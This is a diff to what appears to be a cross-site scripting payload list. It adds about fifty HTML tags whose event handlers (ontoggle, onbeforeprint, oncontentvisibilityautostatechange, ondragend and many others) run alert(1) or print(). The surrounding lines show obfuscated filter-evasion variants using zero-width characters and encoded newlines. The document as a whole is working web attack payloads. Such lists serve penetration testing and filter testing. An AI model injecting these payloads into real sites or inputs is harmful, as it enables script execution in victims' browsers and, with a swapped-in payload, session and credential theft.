@@ -5,6 +5,56 @@
 <select><​style></select>
 <svg onload​=alert(1)> 
 <​/style>
+<xss onafterscriptexecute=alert(1)><script>1</script>
+<body onbeforeprint=console.log(1)>
+<xss onbeforescriptexecute=alert(1)><script>1</script>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
+<xss oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>
+<input type=hidden oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto>
+<svg><animate onend=alert(1) attributeName=x dur=1s>
+<audio src/onerror=alert(1)>
+<a id=x tabindex=1 onfocus=alert(1)></a>
+<xss onfocus=alert(1) autofocus tabindex=1>
+<a id=x tabindex=1 onfocusin=alert(1)></a>
+<body onhashchange="print()">
+<body onload=alert(1)>
+<video onloadstart="alert(1)"><source></xss>
+<body onmessage=print()>
+<body onpagereveal=alert(1)>
+<body onpageshow=alert(1)>
+<body onpopstate=print()>
+<audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
+<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />
+<body onresize="print()">
+<xss onsecuritypolicyviolation=alert(1)>XSS</xss>
+<audio controls onsuspend=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
+<details ontoggle=alert(1) open>test</details>
+<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>
+<audio onwebkitplaybacktargetavailabilitychanged=alert(1)>
+<body onafterprint=alert(1)>
+<input onauxclick=alert(1)>
+<a onbeforecopy="alert(1)" contenteditable>test</a>
+<a onbeforecut="alert(1)" contenteditable>test</a>
+<xss contenteditable onbeforeinput=alert(1)>test
+<xss onbeforepaste=alert(1)>XSS</xss>
+<input type=file oncancel=alert(1)>
+<input onchange=alert(1) value=xss>
+<xss onclick="alert(1)" style=display:block>test</xss>
+<xss oncontextmenu="alert(1)" style=display:block>test</xss>
+<xss ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</xss>
+<xss draggable="true" ondragend="alert(1)" style=display:block>test</xss>
+<xss draggable="true" ondragexit="alert(1)" style=display:block>test</xss>
+<form onformdata="alert(1)"><button>Click</button></form>
+<video onfullscreenchange=alert(1) src=validvideo.mp4 controls>
+<div ongesturechange=alert(1)>XSS</div>
+<div ongestureend=alert(1)>XSS</div>
+<div ongesturestart=alert(1)>XSS</div>
+<input oninput=alert(1) value=xss>
+<form><input oninvalid=alert(1) required><input type=submit>
+<xss onmousedown="alert(1)" style=display:block>test</xss>
+<xss onmouseenter="alert(1)" style=display:block>test</xss>
+<xss onmouseleave="alert(1)" style=display:block>test</xss>
 "><img src=x onerrora=confirm() onerror​=confirm(1)>
 <dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
 <svg onload​=alert&#0000000040"1")><””>
